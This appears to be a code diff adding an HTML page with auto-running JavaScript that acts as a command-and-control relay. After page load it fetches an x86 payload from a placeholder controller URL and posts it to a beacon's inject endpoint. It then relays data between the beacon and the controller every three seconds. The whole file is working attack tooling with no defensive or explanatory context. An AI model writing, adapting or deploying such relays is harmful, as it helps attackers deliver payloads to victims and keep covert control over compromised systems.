@@ -1,0 +1,92 @@
+<html>
+<head>
+</head>
+<body>
+
+<script type="text/javascript">
+	
+var beaconURL = "BEACON_URL"; 
+var controllerURL = "CONTROLLER_URL";
+var arch = "x86";
+
+
+function sendToBeacon(data){
+	// will return data from beacon
+		// Send data to the controller
+	var xhr = new XMLHttpRequest();
+	xhr.open( "POST", beaconURL + "send/", false ); // false for synchronous request
+    xhr.send(data);
+
+
+    // Receives data from the controller
+    var response = new XMLHttpRequest();
+    response.open( "GET", beaconURL + "receive/", false );
+    response.send(null);
+
+  	return response.responseText;
+
+}
+
+function sendToController(data){
+	// Send data to the controller
+	var xhr = new XMLHttpRequest();
+	xhr.open( "POST", controllerURL + "send/", false ); // false for synchronous request
+    xhr.send(data);
+    // Receives data from the controller
+    var response = new XMLHttpRequest();
+    response.open( "GET", controllerURL + "receive/", false );
+    response.send(null);
+
+  	return response.responseText;
+
+}
+
+function getPayload(){
+	var xmlHttp = new XMLHttpRequest();
+	xmlHttp.open( "GET", controllerURL + "arch/" + arch, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+function injectPayload(){
+	var xhr = new XMLHttpRequest();
+	xhr.open( "POST", beaconURL + "inject", false ); // false for synchronous request
+    xhr.send( getPayload() );
+   return xhr.responseText;
+}
+
+function isAlive(){
+
+	return true;
+
+}
+
+window.setTimeout(
+    function () {
+        var send_to_beacon;
+        var send_to_controller;
+        if (isAlive()) {
+          
+            send_to_controller = injectPayload();
+            
+            window.setInterval(function () {
+
+                send_to_beacon = sendToController(send_to_controller);
+                send_to_controller = sendToBeacon(send_to_beacon);
+               
+
+            }, 3000);
+
+        }
+        }, 3000);
+
+
+</script>
+	
+
+
+</body>
+	
+
+
+</html>
